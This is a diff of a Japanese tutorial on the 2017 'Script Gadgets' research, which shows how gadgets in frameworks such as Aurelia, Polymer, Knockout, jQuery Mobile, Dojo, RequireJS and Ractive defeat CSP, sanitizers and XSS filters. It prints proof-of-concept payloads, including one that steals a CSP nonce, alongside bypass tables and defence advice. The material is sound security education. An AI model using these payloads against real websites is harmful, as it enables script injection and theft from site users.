+対策はこの種のマークアップに「実行可能なスクリプトが無い」と見て無変更で通す。**この「無害であるという判断」こそが攻撃者に悪用される前提**である。
 
-```javascript
-// フレームワーク側の「機能」コード（正規、攻撃者は書き換えられない）
-document.querySelectorAll('[class]').forEach(el => {
-  // class 属性の値を「テンプレート」として扱い、DOM操作の設定値として利用する仕様
-  const config = el.className;
-  if (config.startsWith('tmpl:')) {
-    el.innerHTML = renderTemplate(config.slice(5)); // ← ここがsink
-  }
-});
+> 出典: Code-Reuse Attacks for the Web — https://acmccs.github.io/papers/p1709-lekiesA.pdf
+
+### 3. スクリプトガジェットの分類（論文 Section 3.5）
+
+論文の最大の貢献の一つは、ガジェットを機能別に分類したことである。多くは単独では実行に至らず、**鎖（chain）**としてつなぐことで初めて有効になる。
+
+#### 3.1 文字列操作ガジェット（String manipulation gadgets）
+
+正規表現・文字置換などで入力文字列を変換するコード。**パターンマッチ型の対策を欺く**のに使える。有名な例が Polymer の「ダッシュ区切り属性名をキャメルケースに変換する」処理（Listing 4）:
+
+```js
+dash.replace(/-[a-z]/g, (m) => m[1].toUpperCase())
 ```
 
-攻撃者が`class`属性に書き込める値が「tmpl:」から始まりさえすれば、`renderTemplate()`の実装次第で、この関数の中でさらにHTML文字列が`innerHTML`に渡される。もし`renderTemplate`が内部でテンプレート式を評価する（例えば`{{...}}`をJavaScriptとして`eval`する）実装になっていれば、攻撃者は
+**なぜ動くか**: `inner-h-t-m-l` という属性名を注入すると、この処理が `innerHTML` に復元してしまう。WAFやサニタイザは「`innerHTML`」という危険な文字列を探すが、`inner-h-t-m-l` はそのブラックリストに引っかからない。ガジェットが「安全に見える文字列」を「危険な文字列」へと変換するため、**文脈破壊文字の検出そのものが無力化される**。
 
+同様の変換は AngularJS のディレクティブ名正規化にも存在する（Listing 5）。`data-` や `x-` の接頭辞を剥がし、`:` `-` `_` に続く文字をキャメルケース化する:
+
+```js
+var PREFIX_REGEXP = /^((?:x|data)[:\-_])/i;
+var SPECIAL_CHARS_REGEXP = /[:\-_]+(.)/g;
+function directiveNormalize(name) {
+  return name.replace(PREFIX_REGEXP, '')
+    .replace(SPECIAL_CHARS_REGEXP, fnCamelCaseReplace);
+}
 ```
-class="tmpl:{{constructor.constructor('alert(document.domain)')()}}"
+
+**なぜ動くか**: サニタイザにブロックされる `ng-` 属性の代わりに、許可されがちな `data-ng-` 系の属性を使える。正規化後に AngularJS はそれを `ng-` ディレクティブとして解釈するため、対策の裏をかける。
+
+#### 3.2 要素生成ガジェット（Element construction gadgets）
+
+新しいDOM要素、特に **`<script>` 要素を生成する**コード（Listing 6）:
+
+```js
+document.createElement(input)
+document.createElement("script")
+jQuery("<" + tag + ">")
+jQuery.html(input) // input が <script> を含む場合
 ```
 
-のような値を注入するだけで、CSPが禁止しているはずの任意コード実行に到達できる。
+代表格は jQuery の `$.globalEval`。これは新しい script 要素を作り `text` プロパティを設定してDOMに追加＝コードを実行する。要素生成ガジェット（3.1系）とJS実行シンクガジェット（3.4系）を兼ねており、`$.html` など多くのjQueryメソッドから呼ばれるため、**strict-dynamic CSPの突破に極めて有用**（後述4.3）。
 
-**なぜ動くか**: この例でCSPは「新しい`<script>`タグや`unsafe-inline`によるインラインスクリプトの実行」だけを制限しており、「nonceで許可された正規スクリプト自身が、DOM上のテキスト値をテンプレート/コードとして再解釈する」処理は制限対象外である。攻撃者は新しいスクリプトを書き込んでいない。既存の、CSPに許可された正規スクリプトの「機能」をリモコン操作しているに過ぎない。ROPで攻撃者が新規の実行可能コードをメモリに書き込まず、既存の命令列を「呼び出す順序」だけで制御するのと同じ構造である。
+#### 3.3 関数生成ガジェット（Function creation gadgets）
 
-`constructor.constructor('...')()`という書き方が使われる理由にも触れておく。多くのテンプレートエンジンや「安全なeval代替」実装は、直接の`eval`呼び出しやグローバルの`Function`コンストラクタへの参照を禁止・サンドボックス化している。しかし、JavaScriptでは任意のオブジェクトから`obj.constructor`（そのオブジェクトを生成したクラス）を辿り、さらにその`.constructor`（つまり`Function`コンストラクタ自身）を取得できてしまう。これは**プロトタイプチェーン（JavaScriptオブジェクトが自身にないプロパティ参照時に、生成元のクラス・親クラスを順に辿っていく仕組み）**の性質を悪用したサンドボックス脱出テクニックであり、`Function`コンストラクタを直接名指しできない制限下でも、任意の文字列をコードとして実行する経路を確保できてしまう。
+`new Function(...)` で新しい関数オブジェクトを作るコード。本体は入力と定数文字列の混合で構成される（Listing 7）。Knockout と Underscore.js の実物:
 
-### 4. 影響範囲：なぜ「主流フレームワーク全般」が対象になったのか
+```js
+// Knockout の関数生成ガジェット
+var body = "with($context){with($data||{}){return{" +
+  rewrittenBindings + "}}}";
+return new Function("$context", "$element", body);
 
-CCS17論文とGoogleの研究チームが実証した最大のポイントは、この種のガジェットが特定の1つのライブラリのバグではなく、**多くの主流JavaScriptフレームワークに構造的に存在する**という点である。UIフレームワークやテンプレートエンジンは「便利さ」のために、DOM属性やデータ値を柔軟に解釈する機能を数多く備えている。柔軟な解釈こそがガジェットの温床になる。したがって、
+// Underscore.js の関数生成ガジェット
+source = "var __t,__p='',__j=Array.prototype.join," +
+  "print=function(){__p+=__j.call(arguments,'');};\n" +
+  source + 'return __p;\n';
+var render = new Function(
+  settings.variable || 'obj', '_', source);
+```
 
-- CSPを`strict-dynamic`や厳格なホワイトリストで固めていても、
-- サーバー側でHTMLエスケープを完全に行っていても、
-- クライアント側のテイント追跡（taint tracking: 「信頼できない入力がどこまで伝播したか」を追跡する解析手法）で入力から直接の危険なsinkまでの単純な経路を塞いでいても、
+**なぜ動くか**: `new Function` は `eval` と同様に文字列からコードを生成する。`rewrittenBindings` や `source` に攻撃者制御文字列が混ざれば任意コードになる。ただし生成された関数は**別のガジェットが呼び出す**必要がある（単独では実行されない）。
 
-「アプリが読み込んでいる正規ライブラリの挙動」そのものが攻撃の踏み台になるため、これらの対策だけでは防げない。特にテイント追跡ベースの防御は、データフローがクライアント側で完結する場合しか捉えられず、サーバーとクライアントをまたぐ「ハイブリッドなデータフロー」（例: サーバー側で一度保存された値が、後で別ページの別のJSコードに読み込まれてガジェット化される、といった経路）には無力である。
+#### 3.4 JavaScript実行シンクガジェット（JavaScript execution sink gadgets）
 
-### 5. 防御策
+チェーンの終端。前段からの入力をDOM XSSの実行シンクに流し込む（Listing 8）:
 
-コード再利用攻撃に対する防御は、単一の銀の弾丸ではなく多層的な対策の組み合わせが必要になる。
+```js
+eval(input);
+inputFunction.apply();
+node.innerHTML = "prefix" + input + "suffix";
+jQuery.html(input);
+scriptElement.src = input;
+node.appendChild(input);
+```
 
-- **信頼するライブラリを最小限にし、バージョンを固定・監査する**: 使用しているフレームワーク自体に既知のガジェットが存在しないか、CVEやセキュリティアドバイザリを確認する。
-- **属性・データ値のホワイトリスト化**: `data-*`属性やクラス名など、ユーザー入力が反映されうる場所には、意味のある値のみを許可するスキーマ検証を導入する（自由形式の文字列を許可しない）。
-- **テンプレートエンジンの安全モードを使う**: Angular 1.x系であれば`$sce`（Strict Contextual Escaping）を有効にし、任意のテンプレート式評価を許可しない設定にする。動的なテンプレートコンパイルを避け、可能であれば事前コンパイル（ビルド時テンプレートコンパイル）を使う。
-- **CSPを唯一の防波堤にしない**: CSPは「新規スクリプトの持ち込み」を防ぐものであり、「既存スクリプトの誤用」までは防げないという限界を前提に、入力バリデーションとサニタイズを併用する。
-- **DOM APIの安全な利用**: `innerHTML`ではなく`textContent`を使う、テンプレートに渡す前に厳格なスキーマでの型検証を行うなど、sink自体を安全なAPIに置き換える。
+最も単純なガジェットの例（Listing 3）はこれ一行で成立する:
 
-### 6. 資料1: CCS17論文「Code-Reuse Attacks for the Web」
+```js
+var button = getElementById("my-button");
+button.innerHTML = button.getAttribute("data-text");
+```
 
-> ⚠️ **未取得の資料**: 「Code-Reuse Attacks for the Web（CCS17論文PDF）」は自動取得できませんでした（理由: 本セッションのegressプロキシにより`acmccs.github.io`および代替ミラー`poseidon.ias.tu-bs.de`へのアクセスがブロックされたため）。以下のURLからユーザーご自身で直接ご覧ください: https://acmccs.github.io/papers/p1709-lekiesA.pdf
+**なぜ動くか**: `data-text` 属性から読んだ値を無検証で `innerHTML` に代入している。`data-text="<img src=x onerror=alert(1)>"` を仕込むだけで実行に至る。
 
-（以下は未取得資料の補足として一般知識およびWeb検索で得られた公開情報に基づく解説です）
+#### 3.5 式パーサ内のガジェット（Gadgets in expression parsers）— 最強のクラス
 
-この論文はSebastian Lekies、Krzysztof Kotowicz（Google）、Samuel Groß、Martin Johns（SAP SE）らにより執筆され、ACM CCS 2017（2017年10月末〜11月、米国ダラスにて開催）で発表された。論文タイトルは正式には「Code-Reuse Attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets」であり、その名の通り「Script Gadgets（スクリプト・ガジェット）」という概念を初めて体系的に定義し、学術的に評価した研究である。
+Aurelia、AngularJS、Polymer、Ractive.js、Vue.js といった**テンプレート系フレームワーク**は、DOMツリーの一部をUIコンポーネントのテンプレートとして解釈し、`${...}` や `{{...}}` のような区切り記号で囲まれた**独自の式言語（expression language）**を評価する。例えば Aurelia の式（Listing 9）:
 
-論文の核心的な主張は次の通りである。
+```html
+<td>${customer.name.capitalize()}</td>
+```
 
-- 従来のXSS対策（HTMLサニタイザ、Web Application Firewall、CSP）は、「攻撃者が注入したペイロードそのものが直接実行可能なコードであること」を前提に設計されている。
-- しかし実際の攻撃では、注入されたコンテンツは一見「ただのデータ」であり、既存の防御機構にはスキャンされても引っかからない。
-- そのデータが、アプリケーション内に既に存在する正規のJavaScriptコード（Script Gadget）によって、Webアプリケーションのライフサイクルの中で徐々に「実行可能なコード」へと変換されていく。
-- この攻撃はクライアント側とサーバー側にまたがる「ハイブリッドなデータフロー」を持つことが多く、クライアント側のみを追跡するテイント解析による防御では検出も防御もできない。
-- 実証実験として、複数の主流JavaScriptフレームワーク・ライブラリに対してガジェットを発見し、CSPの`strict-dynamic`や`unsafe-eval`禁止設定を回避できることを示した。
+フレームワークはこの式を **AST（抽象構文木）にパースして評価**する。ここが致命的なのは、**これら式言語がすべてチューリング完全**である点だ。攻撃者は式言語の表現力を使い、**プロトタイプチェーンを辿ってオブジェクトのコンストラクタや `window` オブジェクトへの参照を取得**し、任意関数を呼べる。Aurelia の式パーサのガジェット実物（Listing 10、簡略版）:
 
-この研究はAppSec EU 2017やBlack Hat USA 2017でも発表されており、業界に大きな影響を与えた。CSP策定コミュニティやフレームワーク開発者に対し、「柔軟な属性解釈機能を持つライブラリは、たとえコード注入の脆弱性がなくても、他の場所での小さな入力反映（マイナーXSS）と組み合わさることで危険なガジェットになりうる」という警鐘を鳴らした点が最大の功績である。
+```js
+if (this.optional('.')) { // プロパティアクセス
+  result = new AccessMember(result, name);
+}
+AccessMember.prototype.evaluate = function(...) {
+  return instance[this.name];
+};
+if (this.optional('(')) { // 関数呼び出し
+  result = new CallMember(result, name, args);
+}
+CallMember.prototype.evaluate = function(...) {
+  return func.apply(instance, args);
+};
+```
 
-> 出典: Code-reuse attacks for the Web: Breaking Cross-Site Scripting Mitigations via Script Gadgets — https://acmccs.github.io/papers/p1709-lekiesA.pdf （参考: https://research.google/pubs/pub46450/ 、 https://dl.acm.org/doi/10.1145/3133956.3134091 ）
+これらを鎖状につなぐと、**無害なHTMLマークアップだけ**で `window.alert` などの任意関数を呼べる。Aurelia を狙う実物のペイロード（Listing 11）:
 
-### 7. 資料2: Google `security-research-pocs` リポジトリ（script-gadgets）
+```html
+<div ref=me
+ s.bind="$this.me.ownerDocument.defaultView.alert(1)"
+></div>
+```
 
-このリポジトリはGoogle Security Researchチームが公開した、CCS17論文の実証コード（Proof of Concept）集である。研究者はSamuel GroßおよびMartin Johnsを含むチームであり、AppSec EU 2017・Black Hat USA 2017での発表に対応する実動デモコードが収められている。なお本リポジトリは2023年1月10日にアーカイブ化され、現在は読み取り専用（メンテナンス終了）となっている。
+**なぜ動くか**: Aurelia は文書内の `ref` 属性と `*.bind` 属性を探してガジェットを起動する。`ref=me` で自要素への参照を `me` に束縛し、`s.bind` の式で `me`（この `<div>`）から `.ownerDocument.defaultView`（＝`window`）を辿り、`alert(1)` を呼ぶ。`<script>` も `eval` も `javascript:` も一切使っていない。式言語のプロパティ辿りだけで `window` に到達している点が肝である。
 
-リポジトリの構成は、フレームワーク／防御機構ごとにディレクトリが分かれている点が特徴である。
+Polymer 1.x を狙うペイロード（Listing 12）:
 
-- `csp/sd/` — CSPの`strict-dynamic`設定を回避するPoC群
-- `csp/ue/aurelia_exploit.php` — Aureliaフレームワークを用いた`unsafe-eval`禁止環境での回避例
-- Dojo、その他複数の主要UIライブラリ向けのexploitファイル（各`*-exploit.*`ファイル）
+```html
+<template is=dom-bind><div
+ c={{alert('1',ownerDocument.defaultView)}}
+ b={{set('_rootDataHost',ownerDocument.defaultView)}}>
+</div></template>
+```
 
-各PoCを動作させるための前提環境として、Apache2 + mod_phpによるHTTP(S)サーバー、TLS証明書、`victim.example.com`と`attacker.example.com`のような仮想ホスト構成が用意されている。これは実際の被害者サイト・攻撃者サイトという2オリジン構成を模し、クロスオリジンでの攻撃シナリオ（例えば攻撃者サイトが被害者サイトへ悪性な値を送り込み、被害者サイトのライブラリがそれをガジェットとして処理する）を再現するためのものである。
+**なぜ動くか**: 著者は手動コード解析により、Polymer 1.x で **`_rootDataHost` という「私的」プロパティを上書きすると、式を別スコープで実行できる**ことを発見した。このプロパティは本来Polymer式からアクセスされることを想定していない「意図せぬガジェット（unintentional gadget）」である。`set()` で `_rootDataHost` を `window` に差し替え、後続のガジェットチェーンを別スコープで発火させている。
 
-このリポジトリが示す最も重要な結論は、**「最新のXSS緩和技術（CSPのstrict-dynamicやunsafe-eval禁止など）を導入していても、アプリケーションが利用する既存の正規JavaScriptコードの中に、任意コード実行へつながるガジェットが実在し、複数の主流フレームワークに共通して見つかる」**という点である。これは単一のライブラリのバグ修正では解決せず、CSPというアーキテクチャレベルの防御思想そのものに構造的な限界があることを実証した点で意義が大きい。
+#### 3.6 ガジェットベース攻撃の表現力
 
-> 出典: google/security-research-pocs（script-gadgets） — https://github.com/google/security-research-pocs/tree/master/script-gadgets
+論文は、ガジェット経由で**チューリング完全な任意コード**を実行する3つの道を整理する。
 
-### 8. まとめ
+- **eval系関数の呼び出し**: `eval` や `new Function` を呼べれば任意実行は直截。`window.alert` を1引数で呼べる例なら、同じ手口で `window.eval` も呼べる。
+- **script要素の追加**: 攻撃者制御の `src` または本体を持つ `<script>` を追加する。
+- **式言語の表現力の悪用**: CSPの一部の変種（nonceのみ、hashのみ）では上記2つが使えない。その場合でも式言語自体がチューリング完全なので、式インタプリタを起動できれば式言語と同等の表現力を得られる。
 
-コード再利用攻撃（Script Gadgets）は、「攻撃者が新しい実行可能コードを注入する」という従来のXSSの前提を覆し、「アプリケーションが既に信頼している正規コードの機能を、想定外の入力で誤作動させる」という新しい攻撃モデルを提示した。この仕組みを理解する上で重要なのは、CSPが防いでいるのは「誰のコードが実行されるか（出所の制御）」であり、「そのコードが何をするか（挙動の制御）」までは保証しないという点である。防御側は、CSPやサニタイザといった単一の対策に依存せず、DOM属性やデータ値に対する厳格な入力検証、テンプレートエンジンの安全モード活用、そして利用ライブラリ自体の継続的な監査という多層防御の発想を持つ必要がある。
+### 4. 4大XSS対策の具体的な突破（論文 Section 4）
+
+論文は対策を「戦略」で3分類する。**(1) リクエストフィルタリング**（リクエストがアプリに届く前に遮断＝NoScript、WAF）、**(2) レスポンスサニタイズ**（レスポンス中の悪性コードを検出・除去＝HTMLサニタイザ、IE/EdgeのXSSフィルタ）、**(3) コードフィルタリング**（実行直前に良性/悪性を判定＝CSP、ChromeのXSS Auditor）。ガジェットはこの**どの戦略も原理的に回避する**。
+
+#### 4.1 リクエストフィルタリング（NoScript / WAF）の突破
+
+これらは `<script>` や `onerror` のような**既知の攻撃文字列**や文脈破壊文字（`<` `>`）を列挙して検出する。ガジェットは `class` や `id`、`data-*` のような**無害とされる属性**しか使わないため検出をすり抜ける。Knockout を使い NoScript を破る例（Listing 13）:
+
+```html
+<iframe src="//knockout.example.com/?xss=
+    <div data-bind=value:a=location></div>
+    <div data-bind=value:a.href=name></div>"
+  name="javascript:alert(1)"></iframe>
+```
+
+**なぜ動くか**: NoScript は `location.href=name`（`name` は攻撃者が設定可能なので危険）を攻撃と判定する。しかしフレームワークの表現力を使い、これを `a=location` と `a.href=name` の**2つの無害な式に分割**している。個々には無害だが、Knockout が両方を評価するとき合わさって「`location.href` を `name`（`javascript:alert(1)`）に設定」となる。NoScript はマークアップを解析して「この2つが一緒に実行される」ことまでは見抜けない。
+
+#### 4.2 レスポンスサニタイズ（DOMPurify / Closure / IE-Edge）の突破
+
+サニタイザはホワイトリストで安全なタグ・属性を列挙し、それ以外を除去する。しかし `data-*`・`id`・`class` は大抵許可される。jQuery Mobile を使い DOMPurify を破る例（Listing 14。IEのXSSフィルタにも有効）:
+
+```html
+<div data-role=popup id='-->
+  &lt;script&gt;alert(1)&lt;/script&gt;'>
+</div>
+```
+
+**なぜ動くか**: DOMPurify から見れば、これは `data-role` と `id` を持つ完全に安全な `<div>` である。ところが jQuery Mobile は `data-role=popup` の要素を見つけると、**その `id` を使ってHTMLコメントを自動的に注入する**。攻撃者は `id` 値の中の `-->` でそのコメントから脱出し、その後の（HTMLエンティティが復元された）`<script>` を実行させる。サニタイザは「サニタイズ後は安全」と判断するが、ライブラリのその後の処理が安全性を壊す。
+
+#### 4.3 コードフィルタリング（CSP / XSS Auditor）の突破 — 最重要
+
+論文は「コードフィルタリングこそガジェットに**最も脆弱**」と結論する。ガジェットは正規コードの一部なので、実行時のコード検査をすり抜けるのは当然だからだ。
+
+**XSS Auditor（Chrome/Safari）**: 16フレームワーク中13で突破。多くのガジェットが伝統的DOM XSSシンクを使い、DOM XSS防御がAuditorの既知の弱点だったため。Dojo の例（Listing 15）:
+
+```html
+<div
+  data-dojo-type="dijit/Declaration"
+  data-dojo-props="}-alert(1)-{">
+</div>
+```
+
+**なぜ動くか**: Dojo は `data-dojo-props` 属性の値を `eval` に渡す。`}-alert(1)-{` は Dojo がオブジェクトリテラルに埋め込むと `eval` 内で `alert(1)` が評価される形になる。ペイロードは（リクエスト中のスクリプトと一致しないので）Auditorのマッチングを逃れる。
+
+**unsafe-eval CSP**: 16中10で突破。式パーサのガジェットか eval系ガジェットを使う。通常 `unsafe-eval` は「攻撃者が直接 `eval` への注入口を見つけるのは難しい」ためそこそこ安全と信じられてきたが、ガジェットは **DOMノードとして注入した内容を eval-gadget に評価させる**という間接経路を提供する。著者はクロール中に**意図せず Tumblr の unsafe-eval ポリシーを自動突破してしまった**と報告している。
+
+**strict-dynamic CSP**: 16中13で突破（うち2つは `unsafe-eval` の併存に依存）。`strict-dynamic` は「nonce付きで信頼されたスクリプトが動的に生成した子スクリプトへ、信頼を自動伝播する」キーワードである。RequireJS の例（Listing 16）:
+
+```html
+<script data-main='data:1,alert(1)'></script>
+```
+
+**なぜ動くか**: `<script>` に `data-main` 属性があるため、RequireJS のガジェットが `src` を `data:,alert(1)` に向けた**新しいscript要素を生成**する。RequireJS 自体は既に信頼されているので、`strict-dynamic` が**その信頼を新要素に伝播**させ、`data:` スクリプトが実行される。著者は「多くのフレームワークにガジェットが遍在する以上、strict-dynamic で現代Webアプリを守るのは従来考えられていたほど有効ではない」と述べる。Facebook の `fbevents.js` にも strict-dynamic 突破ガジェットを検出したと報告している。
+
+**nonce/hash/whitelist のみの強いCSP**: これらでも**式パーサ内ガジェット**は有効。`eval` も新script要素も使わず `window` を取って任意関数を呼ぶため、CSPには検出・遮断のしようがない（Aurelia・Vue.js・Polymer 1.x で確認）。さらに Ractive では **CSP nonce を盗み出して新scriptに再利用する**ガジェットを発見（Listing 17）:
+
+```html
+<script id='template' type='text/ractive'>
+<iframe srcdoc='<script
+  nonce={{@global.document.currentScript.nonce}}>
+  alert(document.domain)
+</{{}}script>'>
+</iframe>
+</script>
+```
+
+**なぜ動くか**: Ractive のテンプレート式 `{{@global.document.currentScript.nonce}}` が**現在実行中スクリプトの正規nonceを読み取り**、それを `srcdoc` 内の新しい `<script>` に付与する。nonceが正しいのでCSPは信頼して実行する。`</{{}}script>` は式評価で `</script>` になり、外側のscriptを閉じないための小技。**nonceのみの「強い」CSPすら破られる**ことを示す決定的な例である。
+
+### 5. 実証実験：どれほど蔓延しているか（論文 Section 5）
+
+著者は「ガジェットが稀ならライブラリ側の注意で済むが、蔓延していればXSS自体を直すのと同じくらい難しい問題だ」という問いを立て、**大規模自動計測**を行った。
+
+#### 5.1 検出手法
+
+- **大規模検出**: ブラウザベースの**動的テイント追跡（taint tracking）エンジン**を自作。DOMノードから `eval`・`innerHTML`・`document.write`・`XMLHttpRequest.open()` など**60種類以上のシンク**へのデータフローを報告する。DOMツリー全体を「汚染済み」とマーク（＝反射型HTMLインジェクション能力の模擬）し、汚染値がシンクに届くかを見る。
+- **検証（偽陽性ゼロ方式）**: フローが実際に無害マークアップから悪用可能かを、**検証用関数 `verify()` を呼ばせる実exploit**を生成して確かめる。ペイロードは既定では実行されない形に加工する。例えば `<svg onload=verify()>` を `data-text` 属性に**HTMLエンコードして**格納し（Listing 20）、ガジェットが読み取って復元・実行したときだけ `verify()` が発火する:
+
+```html
+<div id="button"
+    data-text="&lt;svg onload=verify()&gt;">
+</div>
+```
+
+さらに、CSPが無くても直接実行してしまう**偽陽性を避けるため**、`<xmp>` などの非実行タグを使う工夫もした（Listing 22）:
+
+```html
+<xmp id="foo"><script>verify()</script></xmp>
+```
+
+**なぜこう作るか**: これにより「ガジェットが読んで復元して初めて実行される」ケースだけをカウントできる。極めて保守的で偽陽性ゼロだが、その代償として**検出できないケース（偽陰性）が増える**ため、得られた数値はすべて**下限（lower bound）**である。
+
+#### 5.2 主要な数値
+
+Alexa 上位5000サイトを起点に、同一ドメイン/サブドメインへの一次リンクを辿り **647,085ページ**をクロール（37,232サブドメイン、4,557セカンドレベルドメインを含む）。
+
+| 計測項目 | 数値 |
+|---|---|
+| 総シンク呼び出し数（DOM由来データ付き） | **4,352,491回** |
+| DOM内のユニークなソース数 | 4,889,568 |
+| 1URLあたり平均シンク呼び出し | 7.67回 |
+| 何らかの関連データフローを持つドメイン割合 | **81.85%** |
+| JS実行関数で終わるフローを持つドメイン（unsafe-eval関連） | **47.76%** |
+| script要素生成/src注入系フローを持つドメイン（strict-dynamic関連） | **73.03%** |
+| HTML属性→シンクのフローを持つドメイン | 78.30% |
+| うち `data-*` 属性由来 | 59.51% |
+| `id` 属性由来 / `class` 属性由来 | 15.67% / 10% |
+| 生成した exploit 候補 | 1,762,823件 |
+| **検証済みガジェット** | **285,894件** |
+| **ガジェットを検証できたドメイン** | **906ドメイン＝全体の 19.88%** |
+
+論文が16フレームワークを手動解析した結果の対策別突破本数（Table 1）:
+
+| CSP whitelist | CSP nonce | unsafe-eval | strict-dynamic | Chrome XSS | Edge XSS | NoScript | DOMPurify | Closure | ModSecurity |
+|---|---|---|---|---|---|---|---|---|---|
+| 3 | 4 | 10 | 13 | 13 | 9 | 9 | 9 | 6 | 9 |
+
+**読み方**: コードフィルタリング系（strict-dynamic 13、Chrome XSS Auditor 13、unsafe-eval 10）が最も破られやすい。**16フレームワーク中13で strict-dynamic を突破**できたことが、「nonce + strict-dynamic こそ現代CSPの本命」という当時の楽観への強い反証となった。一方、実証実験では自動検出可能なシンク終端型ガジェットに絞ったため、**19.88%のドメインで完全動作するexploitを生成・検証**できた（これも下限値）。
+
+### 6. Google `script-gadgets` PoC リポジトリ
+
+論文の攻撃を再現できる形で公開されたのが GitHub の **`google/security-research-pocs` 内 `script-gadgets` ディレクトリ**である（2023年1月10日にアーカイブ＝読み取り専用化）。
+
+#### 6.1 構成
+
+- 著者: Sebastian Lekies、Eduardo Vela Nava、Krzysztof Kotowicz（Google）。
+- 収録資料: AppSec EU 2017 スライド、Black Hat USA 2017 スライド（`Breaking_XSS_mitigations_via_Script_Gadgets_BHUSA.pdf`）、CCS'17 論文本体（`ccs_gadgets.pdf`）。
+- 実行環境: PHP対応のHTTP(S)サーバ（Apache2 + mod_php）。仮想ホスト `victim.example.com` と `attacker.example.com` を同一ディレクトリで提供する。一部ペイロードは ModSecurity や TLS証明書（LetsEncrypt）を要する。
+- **突破する対策ごとにディレクトリ整理**されている。例: `/repo/csp/sd/` が strict-dynamic 突破、`/repo/csp/ue/` が unsafe-eval 突破。各ディレクトリの `*-exploit.*` ファイルが1フレームワーク分。例えば `/repo/csp/ue/aurelia_exploit.php` は「Aureliaで unsafe-eval CSP を破る」PoC。
+- 突破一覧は `bypasses.md`。
+
+#### 6.2 フレームワーク別 突破マトリクス（bypasses.md）
+
+各セルは「そのフレームワークのガジェットで、その対策を突破できる」ことを示す。原典のPoC付き一覧を要約する（✔＝突破あり、-＝不可/条件付き）。
+
+| フレームワーク | CSP whitelist | CSP nonce | unsafe-eval | strict-dynamic | Chrome | Edge | NoScript | DOMPurify | Closure | ModSecurity |
+|---|---|---|---|---|---|---|---|---|---|---|
+| Vue.js 2.3.0 | | | ✔ | ✔(u-e) | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
+| Aurelia (2017-03-21) | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
+| Angular 1.6.1 | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
+| Polymer 1.7.1 | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | -(`<template`) | -(`<template`) | ✔ |
+| Underscore 1.8.3 / Backbone | | | ✔ | - | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
+| Knockout 3.4.1 | | | ✔ | ✔(u-e) | ✔ | ✔ | ✔ | ✔ | -(data-/comments) | ✔ |
+| jQuery Mobile 1.4.5 | - | - | ✔ | ✔ | ✔ | ✔ | | ✔ | ✔ | ✔ |
+| Ember.js 2.10.2 | - | - | ✔(dev) | ✔(dev) | | | | | | |
+| React | - | - | | | | | | | | |
+| Closure | | | | ✔ | ✔ | -(`<a.*`) | ✔ | | | |
+| Ractive 0.8.1 | -(`{{}}`はeval) | ✔ | ✔ | ✔ | ✔ | -(`<script`) | -(scriptノード) | -(script) | -(script) | -(script) |
+| Dojo 1.12.2 | | | ✔ | | ✔ | ✔ | ✔ | ✔ | -(data-) | ✔ |
+| RequireJS 2.3.2 | | | | ✔ | ✔ | -(`<script`) | | | | |
+| jQuery 3.1.1 | - | - | | ✔ | | -(`<script`) | | | | |
+| jQuery UI 1.12.1 | - | - | | ✔ | ✔ | | ✔ | ✔ | ✔ | ✔ |
+| Bootstrap 3.3.7 | | | | ✔ | ✔ | ✔ | -(HTML in attr) | ✔ | | |
+
+**この表から読み取るべきこと**:
+
+- **Aurelia と Angular 1.6.1 は全対策を突破**（式パーサ由来の最強クラスのガジェットを持つため）。whitelist/nonceのみの強いCSPすら破れるのは、この式パーサガジェットの威力を示す。
+- **React だけが突破例ゼロ**。理由は、Reactが**JSXでコンパイル済みの仮想DOMを使い、HTML文字列やDOM属性を式言語として解釈しない設計**だからである。DOM属性から実行に至る「意味の再解釈」経路を持たないアーキテクチャが、構造的にガジェットを生みにくいことを端的に示す（設計上の重要な教訓）。
+- Polymer が DOMPurify/Closure で `-` なのは、両サニタイザが `<template>` を（当時）サポートせず除去するため。Ractive が多くの列で `-` なのは、そのガジェットが `<script>` ノードを要し、それらの対策に除去されるため。つまり**「バージョンと対策の組み合わせ」で成否が決まる**点に注意。
+- 対象バージョンはすべて2016〜2017年頃のもの。これらは古い版であり、後継版（Angular 2+/Vue 3 等）や各サニタイザの更新で状況は変わり得る。本表はあくまで**論文発表時点（2017年）のスナップショット**として読むこと。
+
+> 出典: google/security-research-pocs — script-gadgets — https://github.com/google/security-research-pocs/tree/master/script-gadgets
+
+### 7. 防御：論文の結論と実務的な指針
+
+論文（Section 6）は、対策を3方向で論じつつ、いずれも決定打にならないと率直に述べる。
+
+1. **対策技術を直す（Fix the Mitigation）**: 全ガジェットに対応するのは困難。式言語・フレームワーク・ユーザーランドコードのバリエーションが多すぎる。ただし部分的には可能で、**HTMLサニタイザが `data-*`・`id`・`class` 属性をフィルタする**ことは有効な一歩だと提案する（実証実験で `data-` 由来フローが59.51%あったことが根拠）。
+2. **アプリ/ライブラリを直す（Fix the Applications）**: ライブラリからガジェットを除去する。しかしガジェットの多くはフレームワークの**機能そのもの**であり開発者が消したがらない。加えて「意図せぬガジェット（`_rootDataHost` の例）」は発見が普通のXSSより難しく、**XSS自体を直すのと同じくらい大変**だと結論。
+3. **緩和（mitigation）から隔離・予防（isolation & prevention）へ発想を転換**: 論文の最終提言。Sandboxed iframe、Suborigins、Isolated Scripts などの**隔離技術**と、そもそも脆弱性を書けなくする**安全な既定API（secure-by-default）**へ舵を切るべきだとする。「Webプラットフォームは本質的に危険であり、初心者が安全なアプリを作れる仕組みが必要」という主張は、後年の **Trusted Types**（本書 s8a で扱う）や CSP の強化提案へと繋がっていく。
+
+#### 実務者へのまとめ
+
+- **CSP を貼っただけ、サニタイザを通しただけでは安全ではない。** ページ上に動いている全ライブラリの「DOM属性をコードとして再解釈する挙動」まで含めて脅威モデルに入れること。
+- **`unsafe-eval` と `strict-dynamic` はCSPを大きく弱める**（論文は "considerably weaken a CSP policy" と明言）。使うなら細心の注意を。
+- サニタイザ設定では、**`data-*`・`id`・`class` を無条件に許可しない**ことを検討する。フレームワーク（Angular/Vue/Polymer 等）を使うページでは、これらが式・ディレクティブの入り口になり得る。
+- 新規開発では、**DOM属性やHTML文字列を式言語として解釈しないアーキテクチャ**（React系のコンパイル型、あるいは Trusted Types による実行シンクの型強制）を選ぶこと自体が、ガジェット面積を根本的に減らす。
+
